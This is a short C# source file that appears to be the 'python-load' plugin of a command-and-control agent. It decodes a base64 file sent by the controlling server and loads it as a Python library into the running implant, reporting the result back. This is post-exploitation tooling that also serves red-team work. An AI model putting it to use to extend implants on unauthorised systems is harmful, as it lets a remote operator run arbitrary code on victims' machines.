using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using Agent.Utilities;
namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "python-load";
        private IMessageManager messageManager { get; set; }
        private IPythonManager pythonManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            this.pythonManager = pythonManager;
        }

        public async Task Execute(ServerJob job)
        {
            PythonLoadArgs pyArgs = JsonSerializer.Deserialize<PythonLoadArgs>(job.task.parameters);

            if (pyArgs is null)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to parse args.",
                    completed = true
                });
                return;
            }

            byte[] fContents = Misc.Base64DecodeToByteArray(pyArgs.file);

            if (pythonManager.LoadPyLib(fContents))
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Loaded.",
                    completed = true
                });
            }
            else
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to load lib.",
                    completed = true
                });
            }
        }
    }
}
